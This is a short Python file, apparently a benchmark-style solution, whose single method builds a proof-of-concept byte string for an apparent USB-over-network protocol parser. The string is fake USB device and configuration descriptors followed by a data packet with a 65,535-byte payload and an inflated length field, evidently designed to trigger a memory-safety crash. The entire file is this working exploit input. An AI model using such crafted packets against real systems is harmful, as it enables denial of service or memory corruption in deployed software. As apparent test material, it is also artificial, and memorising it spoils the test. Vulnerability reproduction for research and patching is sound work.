import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        device_desc = b'\x12\x01\x00\x02\x00\x00\x00\x40\x34\x12\x78\x56\x00\x01\x00\x00\x00\x01'
        config_desc = b'\x09\x02\x20\x00\x01\x01\x00\x80\x32\x09\x04\x00\x00\x02\x00\xff\x00\x00\x07\x05\x01\x02\x00\x02\x00\x07\x05\x81\x02\x00\x02\x00'
        data_add = device_desc + config_desc
        packet_add = b'\x00\x00\x00\x38\x01\x00' + data_add
        data_len = 65535
        packet_len_data = 12 + data_len
        len_be = struct.pack('>I', packet_len_data)
        type_sub = b'\x02\x00'
        id_b_d_e = b'\x00\x00\x00\x01'
        data_size_le = struct.pack('<H', data_len)
        data_payload = b'\x00' * data_len
        packet_data = len_be + type_sub + id_b_d_e + data_size_le + data_payload
        poc = packet_add + packet_data
        return poc
